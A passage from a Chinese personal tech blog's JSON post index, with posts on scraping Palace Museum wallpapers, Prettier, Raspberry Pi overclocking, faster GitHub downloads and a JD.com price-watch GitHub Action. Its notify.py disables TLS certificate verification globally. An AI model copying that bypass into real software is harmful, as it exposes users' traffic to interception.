class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span 